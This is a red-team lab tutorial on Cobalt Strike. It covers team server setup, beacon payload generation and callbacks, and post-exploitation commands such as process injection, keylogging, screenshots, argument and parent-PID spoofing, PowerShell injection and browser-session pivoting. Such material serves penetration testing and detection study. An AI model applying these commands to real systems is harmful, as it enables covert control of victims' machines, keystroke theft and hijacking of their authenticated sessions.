# Cobalt Strike 101

This lab is for exploring the advanced penetration testing / post-exploitation tool Cobalt Strike.

### Definitions

* Listener - a service running on the attacker's C2 server that is listening for beacon callbacks
* Beacon - a malicious agent / implant on a compromised system that calls back to the attacker controlled system and checks for any new commands that should be executed on the compromised system
* Team server - Cobalt Strike's server component. Team server is where listeners for beacons are configured and stood up.

### Getting Started

#### Team Server

{% code title="attacker\@kali" %}
```csharp
# the syntax is ./teamserver <serverIP> <password> <~killdate> <~profile>
# ~ optional for now
root@/opt/cobaltstrike# ./teamserver 10.0.0.5 password
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LV_I9pw2guKcDHOkKPn%2F-LV_LKn33__1Whr2-emi%2FScreenshot%20from%202019-01-06%2022-47-10.png?alt=media\&token=001a9708-ada7-43bb-ae28-485dcf5391a1)

{% hint style="info" %}
Note that in real life red team engagements, you would put the team servers behind redirectors to add resilience to your attacking infrastructure. See [Red Team Infrastructure](./).
{% endhint %}

#### Cobalt Strike Client

{% code title="attacker\@kali" %}
```csharp
root@/opt/cobaltstrike# ./cobaltstrike
```
{% endcode %}

Enter the following:

* host - team server IP or DNS name
* user - anything you like - it's just a nickname
* password - your team server password

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LV_I9pw2guKcDHOkKPn%2F-LV_MN4fHOQ2jl-VTud-%2FScreenshot%20from%202019-01-06%2022-51-40.png?alt=media\&token=e0824687-6401-48a8-bdb6-b131e1fa8287)

#### Demo

All of the above steps are shown below in one animated gif:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LV_N6Ag_cdxwAPThqY1%2F-LV_NZxyuqDTerCXZOkv%2FPeek%202019-01-06%2022-56.gif?alt=media\&token=65297051-1517-4e68-93a6-78c102ebf947)

### Setting Up Listener

Give your listener a descriptive name and a port number the team server should bind to and listen on:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LVdSx13-IuwDIBpOeNw%2F-LVdTdup2niEPXR2Kvxw%2FPeek%202019-01-07%2018-01.gif?alt=media\&token=d0929c9c-32b7-4c21-bd39-12686bf5676a)

### Generating a Stageless Payload

Generate a stageless (self-contained exe) beacon - choose the listener your payload will connect back to and payload architecture and you are done:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LVdSx13-IuwDIBpOeNw%2F-LVdUCalwVOHCQrVXUM2%2FPeek%202019-01-07%2018-03.gif?alt=media\&token=c46868a8-e0b8-4712-a1ac-f15657304d4f)

### Receiving First Call Back

On the left is a victim machine, executing the previously generated beacon - and on the left is a cobalt strike client connected to the teamserver catching the beacon callback:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LVdUPAgnZ0HsUytfvLF%2F-LVdWm4zqWSU8tlccTXa%2FPeek%202019-01-07%2018-15.gif?alt=media\&token=096b5cf5-8965-4760-a0d3-313f83aa3613)

### Interacting with Beacon

Right click the beacon and select interact. Note the new tab opening at the bottom of the page that allows an attacker issuing commdands to the beacon:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LVdUPAgnZ0HsUytfvLF%2F-LVdYPL2EWl_kDZgohYE%2FScreenshot%20from%202019-01-07%2018-22-38.png?alt=media\&token=e9d41778-aecd-463a-971c-3c67897679b4)

### Interesting Commands & Features

#### Argue

Argue command allows the attacker to spoof commandline arguments of the process being launched.

The below spoofs calc command line parameters:

{% code title="attacker\@cs" %}
```csharp
beacon> argue calc /spoofed
beacon> run calc
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LVdjwLukX9nZoCi21O8%2F-LVdk8zCI7Za7zTxLzrG%2FScreenshot%20from%202019-01-07%2019-18-23.png?alt=media\&token=a8dd6e72-3c9b-429e-bf62-744f98bf765e)

Note the differences in commandline parameters captured in sysmon vs procexp:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LVdYo9wTGLrwFR9Pr2W%2F-LVdj_Ki8_L-34wNhOpF%2FScreenshot%20from%202019-01-07%2019-09-47.png?alt=media\&token=0cf00abc-7f46-43d4-a0bd-12313e08507e)

Argument spoofing is done via manipulating memory structures in Process Environment Block which I have some notes about:

#### Inject

Inject is very similar to metasploit's `migrate` function and allows an attacker to duplicate their beacon into another process on the victim system:

{% code title="attacker\@cs" %}
```csharp
beacon> help inject
Use: inject [pid] <x86|x64> [listener]

inject 776 x64 httplistener
```
{% endcode %}

Note how after injecting the beacon to PID 776, another session is spawned:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LVdvZd5qH8L-aNwMTY9%2F-LVdxRlTo3-eQwGHPUTO%2FPeek%202019-01-07%2020-16.gif?alt=media\&token=4ca41a85-e57a-4318-8cfe-536515f0169e)

#### Keylogger

{% code title="attacker\@cs" %}
```csharp
beacon> keylogger 1736 x64
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LVdvZd5qH8L-aNwMTY9%2F-LVe-tcmn4MPADKtcpEu%2FScreenshot%20from%202019-01-07%2020-31-30.png?alt=media\&token=764fd2fe-4cde-4d83-8b9f-e055b60d3648)

#### Screenshot

{% code title="attacker\@cs" %}
```csharp
beacon> screenshot 1736 x64
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LVdvZd5qH8L-aNwMTY9%2F-LVe0RXTjankOgwcZ5WW%2FScreenshot%20from%202019-01-07%2020-33-51.png?alt=media\&token=58961ee3-d3ed-4b09-ab3f-bcd5872d88a8)

#### Runu

Runu allows us launching a new process from a specified parent process:

{% code title="attacker\@cs" %}
```csharp
runu 2316 calc
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LVe0gYyisQOmDQ7e7ru%2F-LVe1f1GeMMhEpJQFR1S%2FScreenshot%20from%202019-01-07%2020-39-20.png?alt=media\&token=33cdf218-207e-420a-a641-9bef804a01f6)

#### Psinject

This function allows an attacker executing powershell scripts from under any process on the victim system. Note that PID 2872 is the calc.exe process seen in the above screenshot related to `runu`:

{% code title="attacker\@cs" %}
```csharp
beacon> psinject 2872 x64 get-childitem c:\
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LVe0gYyisQOmDQ7e7ru%2F-LVe2vmq3MBcixP1dBQQ%2FScreenshot%20from%202019-01-07%2020-44-30.png?alt=media\&token=54f61ebd-d9cd-4cd5-8422-378db0a5339c)

Highlighted in green are new handles that are opened in the target process when powershell script is being injected:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LVe0gYyisQOmDQ7e7ru%2F-LVe4dVKfHxW5XSyN59Q%2FScreenshot%20from%202019-01-07%2020-52-16.png?alt=media\&token=53062b61-fbfc-4269-967d-02c8d589ee11)

#### Spawnu

Spawn a session with powershell payload from a given parent PID:

{% code title="attacker\@cs" %}
```csharp
beacon> spawnu 3848 httplistener
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LVe0gYyisQOmDQ7e7ru%2F-LVe5p_J09jqfvzBd2uF%2FScreenshot%20from%202019-01-07%2020-57-30.png?alt=media\&token=13ac6e66-bf82-40e1-b49a-84b454c4c8d2)

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LVe0gYyisQOmDQ7e7ru%2F-LVe5rMtDhif4p33LJEi%2FScreenshot%20from%202019-01-07%2020-57-25.png?alt=media\&token=68a34fae-9bfe-49e4-89e0-b50e05573c68)

#### Browser Pivoting

This feature enables an attacker riding on compromised user's browsing sessions.

The way this attack works is best explained with an example:

* Victim log's in to some web application using Internet Explorer.
* Attacker/operator creates a browser pivot by issuing a `browserpivot` command
* The beacon creates a proxy server on the victim system (in Internet Explorer process to be more precise) by binding and listening to a port, say 6605
* Team server binds and starts listening to a port, say 33912
* Attacker can now use their teamserver:33912 as a web proxy. All the traffic that goes through this proxy will be forwarded/traverse the proxy opened on the victim system via the Internet Explorer process (port 6605). Since Internet Explorer relies on WinINet library for managing web requests and authentication, attacker's web requests will be reauthenticated allowing the attacker to view same applications the victim has active sessions to without being asked to login.

Browser pivotting in cobalt strike:

{% code title="attacker\@cs" %}
```csharp
beacon> browserpivot 244 x86
```
{% endcode %}

Note how the iexplore.exe opened up port 6605 for listening as mentioned earlier:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LVe7nLVoH8BOhlPzZg6%2F-LVeBuMZs1FPDOHJtS04%2FScreenshot%20from%202019-01-07%2021-23-50.png?alt=media\&token=8dbe47f8-f620-47a3-9a31-cee642816bc9)

The below illustrates the attack visually. On the left - a victim system logged to some application and on the right - attacker id trying to access the same application and gets presented with a login screen since they are not authenticated:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LVe7nLVoH8BOhlPzZg6%2F-LVeEiPzItd-5gnk4Nk8%2FScreenshot%20from%202019-01-07%2021-33-54.png?alt=media\&token=39efedde-552c-45bb-bd0e-06da46066480)

The story changes if the attacker starts proxying his web traffic through the victim proxy `10.0.0.5:33912`:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LVe7nLVoH8BOhlPzZg6%2F-LVeElowN_sNm3icObi4%2FPeek%202019-01-07%2021-36.gif?alt=media\&token=03ddc4e7-aa4b-49a5-b3ce-aca872262a3c)

#### System Profiler

A nice feature that profiles potential victims by gathering information on what software / plugins victim system has installed:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LVeIEgOkX8MZihx7rxD%2F-LVeIX1ild0CLK1SOvF7%2FScreenshot%20from%202019-01-07%2021-52-32.png?alt=media\&token=8bfd87c1-fbd7-409d-b043-8784e6d4576d)

Once the the profilder URL is visited, findings are presented in the Application view:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LVeIEgOkX8MZihx7rxD%2F-LVeIc4rnL3lz2uU7Ap0%2FScreenshot%20from%202019-01-07%2021-52-58.png?alt=media\&token=95cfe8b7-a0b4-4304-aa45-df05f8daa575)

Event logs will show how many times the profiler has been used by victims:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LVeIEgOkX8MZihx7rxD%2F-LVeI_nKsWAWy91yDFOq%2FScreenshot%20from%202019-01-07%2021-52-50.png?alt=media\&token=45cff1d1-227c-44af-b773-7e43ae4e0f65)

### References

[https://www.cobaltstrike.com/downloads/csmanual313.pdf](https://www.cobaltstrike.com/downloads/csmanual313.pdf)
